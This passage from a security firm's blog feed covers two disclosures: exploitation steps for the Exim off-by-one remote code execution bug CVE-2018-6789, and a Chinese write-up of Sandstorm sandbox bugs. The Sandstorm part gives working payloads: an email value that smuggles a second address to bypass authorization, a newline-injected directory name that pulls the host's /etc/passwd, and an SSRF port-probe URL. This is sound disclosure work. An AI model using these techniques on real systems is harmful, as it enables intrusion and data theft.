  In most authentication procedure, exim uses base64 encoding to communicate with client. The encode and decode string are stored in a buffer allocated by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get()&lt;/code&gt;.
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get()&lt;/code&gt; for strings&lt;/li&gt;
      &lt;li&gt;can contain unprintable characters, NULL bytes&lt;/li&gt;
      &lt;li&gt;not necessarily null terminated&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Reset in EHLO/HELO, MAIL, RCPT
  When a command is done correctly, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smtp_reset()&lt;/code&gt; is called. This function calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_reset()&lt;/code&gt; to reset block chain to a &lt;strong&gt;reset point&lt;/strong&gt;, which means all storeblocks allocated by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get()&lt;/code&gt; after last command are released.
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_reset()&lt;/code&gt; to reset point (set at the beginning of function)&lt;/li&gt;
      &lt;li&gt;release blocks added at a time&lt;/li&gt;
    &lt;/ul&gt;

    &lt;p&gt;&lt;a href=&quot;https://github.com/Exim/exim/blob/master/src/src/smtp_in.c#L3771&quot;&gt;smtp_in.c: 3771 smtp_setup_msg&lt;/a&gt;&lt;/p&gt;
    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  3771 int
  3772 smtp_setup_msg(void)
  3773 {
  3774 int done = 0;
  3775 BOOL toomany = FALSE;
  3776 BOOL discarded = FALSE;
  3777 BOOL last_was_rej_mail = FALSE;
  3778 BOOL last_was_rcpt = FALSE;
  3779 void *reset_point = store_get(0);
  3780
  3781 DEBUG(D_receive) debug_printf(&quot;smtp_setup_msg entered\n&quot;);
  3782
  3783 /* Reset for start of new message. We allow one RSET not to be counted as a
  3784 nonmail command, for those MTAs that insist on sending it between every
  3785 message. Ditto for EHLO/HELO and for STARTTLS, to allow for going in and out of
  3786 TLS between messages (an Exim client may do this if it has messages queued up
  3787 for the host). Note: we do NOT reset AUTH at this point. */
  3788
  3789 smtp_reset(reset_point);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;exploit-steps&quot;&gt;Exploit steps&lt;/h4&gt;
&lt;p&gt;To leverage this off-by-one, the chunk beneath decoded base64 data should be freed easily and controllable. After several attempts, we found that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sender_host_name&lt;/code&gt; is a better choice. We arrange the heap layout to leave a freed chunk above &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sender_host_name&lt;/code&gt; for the base64 data.
&lt;img src=&quot;/assets/img/blog/20180306/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;Put a huge chunk into unsorted bin
 First of all, we send a EHLO message with huge hostname to make it allocate and deallocate, leaving a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x6060&lt;/code&gt; length (3 storeblocks long) chunk in unsorted bin.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Cut the first storeblock
 Then we send an unrecognized string to trigger &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get()&lt;/code&gt; and allocate a storeblock inside the freed chunk.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Cut the second storeblock and release the first one
 We send a EHLO message again to get the second storeblock. The first block is freed sequentially because of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smtp_reset&lt;/code&gt; called after EHLO is done.&lt;/p&gt;

    &lt;p&gt;After the heap layout is prepared, we can use the off-by-one to overwrite the original chunk size. We modify &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x2021&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x20f1&lt;/code&gt;, which slightly extends the chunk.&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/blog/20180306/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Send base64 data and trigger off-by-one
 To trigger off-by-one, we start an AUTH command to send base64 data. The overflow byte precisely overwrites the first byte of next chunk and extends the next chunk.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Forge a reasonable chunk size
 Because the chunk is extended, the start of next chunk of is changed to somewhere inside of the original one. Therefore, we need to make it &lt;strong&gt;seems like&lt;/strong&gt; a normal chunk to pass sanity checks in glibc. We send another base64 string here, because it requires &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NULL&lt;/code&gt; byte and unprintable character to forge chunk size.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Release the extended chunk
 To control the content of extended chunk, we need to release the chunk first because we cannot edit it directly. That is, we should send a new EHLO message to release the old host name. However, normal EHLO message calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smtp_reset&lt;/code&gt; after it succeeds, which possibly makes program abort or crash. To avoid this, we send an &lt;strong&gt;invalid&lt;/strong&gt; host name such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a+&lt;/code&gt;.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Overwrite the &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;next&lt;/code&gt;&lt;/strong&gt; pointer of overlapped storeblock&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/blog/20180306/6.png&quot; alt=&quot;&quot; /&gt;
 After the chunk is released, we can retrieve it with AUTH and overwrite part of overlapped storeblock. Here we use a trick called &lt;strong&gt;partial write&lt;/strong&gt;. With this, we can modify the pointer without breaking &lt;strong&gt;ASLR&lt;/strong&gt; (Address space layout randomization). We partially changed the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;next&lt;/code&gt; pointer to a storeblock containing ACL (Access Control List) strings. The ACL strings are pointed by a set of global pointers such as:&lt;/p&gt;
    &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;acl_smtp_auth&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;acl_smtp_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;acl_smtp_etrn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;acl_smtp_expn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;acl_smtp_helo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;acl_smtp_mail&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;acl_smtp_quit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;acl_smtp_rcpt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
    &lt;p&gt;These pointers are initialized at the beginning of exim process, set according to the configure. For example, if there is a line &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;acl_smtp_mail = acl_check_mail&lt;/code&gt; in the configure, the pointer &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;acl_smtp_mail&lt;/code&gt; points to the string &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;acl_check_mail&lt;/code&gt;. Whenever MAIL FROM is used, exim performs an ACL check, which expands &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;acl_check_mail&lt;/code&gt; first. While expanding, exim tries to execute commands if it encounters &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;${run{cmd}}&lt;/code&gt;, so we achieve code execution as long as we control the ACL strings. In addition, we do not need to hijack program control flow directly and therefore we can bypass mitigations such as &lt;strong&gt;PIE&lt;/strong&gt; (Position Independent Executables), &lt;strong&gt;NX&lt;/strong&gt; easily.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Reset storeblocks and retrieve the ACL storeblock
 Now the ACL storeblock is in the linked list chain. It will be released once &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smtp_reset()&lt;/code&gt; is triggered, and then we can retrieve it again by allocating multiple blocks.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Overwrite ACL strings and trigger ACL check
 Finally, we overwrite the whole block containing ACL strings. Now we send commands such as EHLO, MAIL, RCPT to trigger ACL checks. Once we touch an acl defined in the configure, we achieve remote code execution.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;fix&quot;&gt;Fix&lt;/h2&gt;
&lt;p&gt;Upgrade to 4.90.1 or above&lt;/p&gt;

&lt;h2 id=&quot;timeline&quot;&gt;Timeline&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;5 February, 2018 09:10 Reported to Exim&lt;/li&gt;
  &lt;li&gt;6 February, 2018 23:23 CVE received&lt;/li&gt;
  &lt;li&gt;10 February, 2018 18:00 Patch released&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;credits&quot;&gt;Credits&lt;/h2&gt;
&lt;p&gt;Vulnerabilities found by Meh, DEVCORE research team.
meh [at] devco [dot] re&lt;/p&gt;

&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;

&lt;p&gt;https://exim.org/static/doc/security/CVE-2018-6789.txt
https://git.exim.org/exim.git/commit/cf3cd306062a08969c41a1cdd32c6855f1abecf1
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6789
http://www.openwall.com/lists/oss-security/2018/02/07/2&lt;/p&gt;

&lt;p&gt;&lt;a id=&quot;heap_exp&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;heap-exploitation-materials-return&quot;&gt;Heap exploitation materials &lt;a href=&quot;#back&quot;&gt;[return]&lt;/a&gt;&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://heap-exploitation.dhavalkapil.com/&quot;&gt;Heap Exploitation&lt;/a&gt;: A tutorial of heap exploitation by Dhaval Kapil&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/shellphish/how2heap&quot;&gt;how2heap&lt;/a&gt;: A repo for learning heap exploitation by Shellphish&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.slideshare.net/AngelBoy1/heap-exploitation-51891400&quot;&gt;Heap exploitation&lt;/a&gt;: (Chinese) A slide introducing basic glibc heap exploitation by Angelboy&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.slideshare.net/AngelBoy1/advanced-heap-exploitaion&quot;&gt;Advanced heap exploitation&lt;/a&gt;: (Chinese) A slide of advanced heap exploitation techniques by Angelboy&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.tw/2014/08/the-poisoned-nul-byte-2014-edition.html&quot;&gt;The poisoned NUL byte&lt;/a&gt;: An article of Null byte off-by-one exploitation by Project Zero&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en/</link>
                <guid>https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en</guid>
                <pubDate>Tue, 06 Mar 2018 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>一次在 Sandstorm 跳脫沙箱的滲透經驗</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2018/01/26/Sandstorm-Security-Review-CVE-2017-6200-en/&quot;&gt;Sandstorm Security Review&lt;/a&gt; (English Version)&lt;br /&gt;
&lt;a href=&quot;/blog/2018/01/26/Sandstorm-Security-Review-CVE-2017-6200/&quot;&gt;一次在 Sandstorm 跳脫沙箱的滲透經驗&lt;/a&gt; (中文版本)&lt;/p&gt;

&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;

&lt;p&gt;2017 年初，我們有個滲透測試專案，專案的標的架構在 &lt;a href=&quot;https://sandstorm.io/&quot;&gt;Sandstorm&lt;/a&gt; 之上。Sandstorm 是一款 Web 平台，使用者可以輕易的在該平台安裝各種 Web App（如 WordPress、GitLab…），該平台最大的特色在於這些 App 都是在沙箱中執行。因此，即使我們測試中找到多項 App 弱點，也無法對平台本身造成威脅。&lt;/p&gt;

&lt;p&gt;為了讓弱點效益最大化，我們將一部分精力轉移到研究 Sandstorm 原始碼，目的是跳脫 App 的沙箱環境看有沒有機會影響整台伺服器。最後，我們找到了幾個少見且有趣的弱點，並申請 CVE 編號如下：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;阻斷服務攻擊（Denial of Service），CVE-2017-6198&lt;/li&gt;
  &lt;li&gt;繞過授權模式（Bypassing Authorization Schema），CVE-2017-6199&lt;/li&gt;
  &lt;li&gt;不安全的直接存取物件（Insecure Direct Object References），CVE-2017-6200&lt;/li&gt;
  &lt;li&gt;服務端請求偽造（Server-Side Request Forgery），CVE-2017-6201&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;漏洞細節&quot;&gt;漏洞細節&lt;/h2&gt;

&lt;h3 id=&quot;cve-2017-6198&quot;&gt;CVE-2017-6198&lt;/h3&gt;

&lt;p&gt;這是一個消耗系統資源造成的 DoS。起因是 Sandstorm 並未完善限制每個 App 所能使用的資源，在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;src/sandstorm/supervisor.c++&lt;/code&gt; 僅限制了每個程序能夠打開的最多檔案數，相關程式碼如下：&lt;/p&gt;

&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SupervisorMain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setResourceLimits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;rlimit&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rlim_cur&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rlim_max&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4096&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;KJ_SYSCALL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setrlimit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RLIMIT_NOFILE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ref: &lt;a href=&quot;https://github.com/sandstorm-io/sandstorm/blob/v0.202/src/sandstorm/supervisor.c++#L824&quot;&gt;https://github.com/sandstorm-io/sandstorm/blob/v0.202/src/sandstorm/supervisor.c++#L824&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;由於 supervisor 未限制子程序數量以及未限制儲存空間用量，因此攻擊者只要讓 App 不斷執行 fork（通常稱為 Fork Bomb）或是大量使用硬碟空間，就會造成伺服器資源不足而中斷服務。&lt;/p&gt;

&lt;h3 id=&quot;cve-2017-6199&quot;&gt;CVE-2017-6199&lt;/h3&gt;

&lt;p&gt;通常 Sandstorm 會設定特定組織成員才能擁有特殊的權限，而系統預設的組織成員判斷方式是檢查使用者 email 中「@」符號最後的字串是否在白名單內，相關程式碼如下：&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;identity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;services&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toLowerCase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;emailDomain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ref: &lt;a href=&quot;https://github.com/sandstorm-io/sandstorm/blob/v0.202/shell/packages/sandstorm-db/db.js#L1112&quot;&gt;https://github.com/sandstorm-io/sandstorm/blob/v0.202/shell/packages/sandstorm-db/db.js#L1112&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;因此，當攻擊者填入的 email 為 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;demo@devco.re,ccc@aaa.bbb&lt;/code&gt;，系統便會將攻擊者視為 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aaa.bbb&lt;/code&gt; 組織的使用者。&lt;/p&gt;

&lt;p&gt;這項攻擊得以成功還有另外一個關鍵點，發生在 Sandstorm 登入的一個特色上。使用 Sandstorm 服務不需要設定密碼，使用者每次欲登入時填入 email，系統便會發送一組每次皆不同的隨機密碼作為登入使用。上述的例子之所以能夠成功，就是因為系統將 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;demo@devco.re,ccc@aaa.bbb&lt;/code&gt; 視為一個 aaa.bbb 網域的使用者，而隨機密碼會發送到 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;demo@devco.re&lt;/code&gt; 以及 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ccc@aaa.bbb&lt;/code&gt; 兩個不同信箱中，只要可以收到密碼就可以登入使用服務。&lt;/p&gt;

&lt;p&gt;直接案例說明：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;在 Sandstorm 限定只有用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aaa.bbb&lt;/code&gt; 網域才可以登入。
&lt;img src=&quot;/assets/img/blog/20180126/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;登入處 email 欄位填入 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;demo@devco.re,ccc@aaa.bbb&lt;/code&gt;。（註：email 欄位在前端有用 HTML5 Validation，但後端並無檢查 email 是否合法）
&lt;img src=&quot;/assets/img/blog/20180126/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;在 demo@devco.re 信箱收到隨機密碼。
&lt;img src=&quot;/assets/img/blog/20180126/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;成功登入，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;demo@devco.re,ccc@aaa.bbb&lt;/code&gt; 被視為一個使用者，且為 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aaa.bbb&lt;/code&gt; 組織成員！
&lt;img src=&quot;/assets/img/blog/20180126/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;在我們的滲透測試中，標的網站是允許認證的網域使用者自行安裝 App 的。因此透過這項繞過弱點，攻擊者可以再搭配本篇其他漏洞（CVE-2017-6198、CVE-2017-6200、CVE-2017-6201）做更進一步的攻擊。&lt;/p&gt;

&lt;h3 id=&quot;cve-2017-6200&quot;&gt;CVE-2017-6200&lt;/h3&gt;

&lt;p&gt;這是一個有趣的弱點，總共組合了兩個驗證上的小疏忽才能達成攻擊！
在 Sandstorm 中每個 Grain（Sandstorm container，簡單來說就是一個 App 沙箱）的擁有者都可以下載該 App 的備份資料，但由於打包流程中存在兩個弱點，因此攻擊者可以打包沙箱外伺服器的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc&lt;/code&gt; 和 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/run&lt;/code&gt; 下的檔案。發生的問題如下：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;打包的流程隱藏了 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var&lt;/code&gt;、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc&lt;/code&gt;、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc&lt;/code&gt; 等敏感目錄，卻沒有隱藏 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc.host&lt;/code&gt; 及 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/run.host&lt;/code&gt; 這兩個目錄。這兩個目錄分別是伺服器下 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc&lt;/code&gt; 和 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/run&lt;/code&gt; 的別名，是較後期的功能。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;系統會將欲打包的合法檔案整理出來透過標準輸入介面傳給 zip 打包，而判斷檔案和檔案間的區隔是靠換行符號(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\n&lt;/code&gt;)。因此，當檔名中出現換行符號，可以插入非法的路徑檔名藉由 zip 打包。程式雖然有檢查檔名是否存在換行符，卻疏忽了檢查目錄名。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Ref: &lt;a href=&quot;https://github.com/sandstorm-io/sandstorm/blob/v0.202/src/sandstorm/backup.c%2B%2B#L271&quot;&gt;https://github.com/sandstorm-io/sandstorm/blob/v0.202/src/sandstorm/backup.c%2B%2B#L271&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;綜合上述兩個弱點，攻擊者只要在沙箱內建立一個目錄 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/exp\n/etc.host/passwd\n&lt;/code&gt;，就可以透過下載備份的功能取得含有伺服器 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; 檔案的備份檔。&lt;/p&gt;

&lt;p&gt;實際情境截圖：&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;先在 Grain 裡新建目錄 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/exp\n/etc.host/passwd\n&lt;/code&gt;，並用 Grain Backup 的功能下載備份檔。
&lt;img src=&quot;/assets/img/blog/20180126/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;解開備份檔後在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;etc.host&lt;/code&gt; 目錄下看到沙箱外伺服器的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;
&lt;img src=&quot;/assets/img/blog/20180126/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;cve-2017-6201&quot;&gt;CVE-2017-6201&lt;/h3&gt;

&lt;p&gt;這是經典的 SSRF（Server-Side Request Forgery）問題，在 Sandstorm 安裝 App 流程沒有限制安裝來源，攻擊者提供一個安裝 URL 就能讓伺服器存取該位置。該問題發生在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://[target]/install/xxxChangeItEveryTimexxx?url=http://127.0.0.1:22/&lt;/code&gt;，這個範例連結得以確認伺服器的 22 port 是否開啟。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20180126/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;center&gt;（Parse Error，代表伺服器 22 port 開啟）&lt;/center&gt;

&lt;h2 id=&quot;後續&quot;&gt;後續&lt;/h2&gt;

&lt;p&gt;在提交弱點後，Sandstorm 官方非常迅速修正了弱點，並且發表了一篇文章：
&lt;a href=&quot;https://sandstorm.io/news/2017-03-02-security-review&quot;&gt;https://sandstorm.io/news/2017-03-02-security-review&lt;/a&gt;&lt;/p&gt;

